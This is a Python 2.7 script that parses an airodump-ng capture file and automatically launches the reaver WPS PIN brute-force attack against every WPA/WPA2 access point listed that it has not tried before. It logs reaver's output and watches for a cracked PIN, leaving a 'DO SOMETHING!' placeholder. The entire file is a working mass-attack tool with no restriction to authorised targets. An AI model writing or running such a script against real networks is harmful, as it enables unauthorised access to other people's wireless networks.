#!/usr/bin/env python2.7
import argparse
import csv
import os.path
import sys
import time
import threading
from subprocess import Popen, PIPE, STDOUT

parser = argparse.ArgumentParser()
parser.add_argument('--csv-file', '-f', action='store', required=True, dest='csv_file',
    help="Path to the csv file generate by airodump-ng.")
parser.add_argument('--data-dir', action='store', default=".grim_reaver", required=False, dest='data_dir',
    help="Location to store state data. Automatically created.")
parser.add_argument('--wireless-devices', '-i', action='store', default="mon0", required=False, dest='wireless_device',
    help="The wireless device to use to do the reaving.")
args = parser.parse_args()

if not os.path.exists(args.csv_file):
    sys.stderr.write("ERROR: csv file {0} does not exist\n".format(args.csv_file))
    sys.exit(1)

if not os.path.isdir(args.data_dir):
    try:
        print "creating data directory {0}".format(args.data_dir)
        os.makedirs(args.data_dir)
    except Exception, e:
        sys.stderr.write("ERROR: unable to create directory {0}: {1}\n".format(args.data_dir, str(e)))
        sys.exit(1)

while True:
    # parse the csv file looking for bssids we have not tried yet
    _SECTION_AP = 0
    _SECTION_CLIENTS = 1

    section = _SECTION_AP

    #try:
    fp = open(args.csv_file, 'rb')
    for line in fp:
        line = line.rstrip()
        if line.startswith('Station MAC'): 
            break

        # skip lines that contain embedded nulls
        # csv module cannot handle this
        if '\0' in line:
            continue

        row = csv.reader([line]).next()

        if len(row) < 1:
            continue

        bssid = row[0].strip()
        channel = row[3].strip()
        privacy = row[5].strip()
        cipher = row[6].strip()
        authentication = row[7].strip()
        essid = row[13].strip()

        # skip header row
        if bssid == 'BSSID':
            continue

        # skip OPN and WEP for now...
        if privacy.startswith('OPN') or privacy.startswith('WEP'):
            continue

        # have we dealt with this bssid before?
        bssid_path = os.path.join(args.data_dir, bssid)
        if not os.path.exists(bssid_path):
            print 'reaving', essid, 'ch', channel, privacy, cipher, authentication, "[{0}]".format(bssid)

            fp = open(bssid_path, 'wb')
            fp.close()

            p = Popen([
                'reaver', 
                '-a', 
                '-i', args.wireless_device, 
                '-b', bssid, 
                '-c', channel, 
                '-vv'],
                stderr=STDOUT,
                stdout=PIPE)

            def timed_out():
                print "TIMED OUT"
                p.kill()

            associated_timer = threading.Timer(10, timed_out)
            associated_timer.start()

            for line in p.stdout:
                print ">>>", line
                if 'Associated with' in line:
                    print "got association"
                    associated_timer.cancel()

                if 'Pin cracked' in line:
                    # DO SOMETHING!
                    pass

    break

    #except Exception, e:
        #sys.stderr.write("ERROR: {0}\n".str(e))
        #raise e
